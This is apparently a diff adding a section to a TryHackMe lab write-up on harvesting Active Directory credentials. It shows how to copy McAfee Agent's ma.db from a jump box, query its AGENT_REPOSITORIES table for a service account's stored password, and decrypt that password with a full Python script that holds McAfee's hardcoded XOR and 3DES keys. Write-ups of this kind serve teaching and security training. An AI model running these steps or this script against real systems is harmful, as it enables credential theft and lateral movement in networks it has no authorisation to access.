@@ -479,3 +479,124 @@ The output:
 >>>> >>>> UserDomain = ZA
 >>>> >>>> UserPassword = ***************
 ```
+
+This task focuses on retrieving Active Directory (AD) credentials stored in a centrally deployed application’s configuration files. Specifically, we target McAfee Enterprise Endpoint Security, which stores authentication details in an SQLite database (`ma.db`).
+
+Many enterprise applications require domain authentication during installation and execution. These applications often store credentials in configuration files, databases, or registry keys. If an attacker gains access to such files, they may recover plaintext or encrypted credentials.
+
+We need to log into the Jump Box again:
+
+```shell
+ssh thm@THMJMP1.za.tryhackme.com
+```
+
+From there we change directory to:
+
+```cmd
+cd C:\ProgramData\McAfee\Agent\DB
+dir
+```
+
+There's `ma.db` file there. Let's copy it to our local machine with `scp`:
+
+```shell
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+```
+
+Now we need to read the database with `sqlitebrowser`
+
+```shell
+sqlitebrowser ma.db
+```
+
+From there we navigate to the __Browse Data__ tab and check __`AGENT_REPOSITORIES`__ table:
+
+![AGENT_REPOSITORIES](screenshot.png "sqlitebrowser ma.db table named AGENT_REPOSITORIES")
+
+For me at least, nothing is visible at this point, so I navigated to __Execute SQL__ tab and wrote:
+
+```sql
+SELECT * FROM AGENT_REPOSITORIES
+```
+
+Now there's some credentials. Correct the `sql` query:
+
+```sql
+SELECT AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES
+```
+
+This delivers exactly what we need, let's save the password hash.
+
+svcAV:jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+
+This python script was buggy for me. It's written for `python2`, but the library it requires `pycryptodome`, when installed with `pip` in the `virtualenv`, doesn't work with `python2` so I debugged the entire code and upgraded it to `python3`. Please if you're running into errors, save yourself some time:
+
+```python3
+#!/usr/bin/env python3
+# Info:
+#    McAfee Sitelist.xml password decryption tool
+#    Jerome Nokin (@funoverip) - Feb 2016
+#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
+#
+# Quick howto:
+#    Search for the XML element <Password Encrypted="1">...</Password>,
+#    and paste the content as argument.
+#
+###########################################################################
+
+import sys
+import base64
+import binascii
+from Crypto.Cipher import DES3
+from Crypto.Hash import SHA
+
+# hardcoded XOR key
+KEY = binascii.unhexlify("12150F10111C1A060A1F1B1817160519")
+
+def sitelist_xor(xs):
+    return bytes(c ^ KEY[i % 16] for i, c in enumerate(xs))
+
+def des3_ecb_decrypt(data):
+    # hardcoded 3DES key
+    key = SHA.new(b'<!@#$%^>').digest() + b"\x00\x00\x00\x00"
+    # decrypt
+    des3 = DES3.new(key, DES3.MODE_ECB)
+    decrypted = des3.decrypt(data)
+    # quick hack to ignore padding
+    return decrypted[0:decrypted.find(b'\x00')].decode() or "<empty>"
+
+
+if __name__ == "__main__":
+
+    if len(sys.argv) != 2:
+        print("Usage:   %s <base64 passwd>" % sys.argv[0])
+        print("Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0])
+        sys.exit(0)
+
+    # read arg
+    encrypted_password = base64.b64decode(sys.argv[1])
+    # decrypt
+    password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
+    # print out
+    print("Crypted password   : %s" % sys.argv[1])
+    print("Decrypted password : %s" % password)
+
+    sys.exit(0)
+```
+
+Now `virtualenv`:
+
+```
+python3 -m virtualenv venv
+source venv/bin/activate
+pip install pycryptodome
+python3 mcafee_sitelist_pwd_decrypt.py <the_password_hash_recovered>
+```
+
+The output should be:
+
+```
+Crypted password   : [...]
+Decrypted password : [...]
+```
+
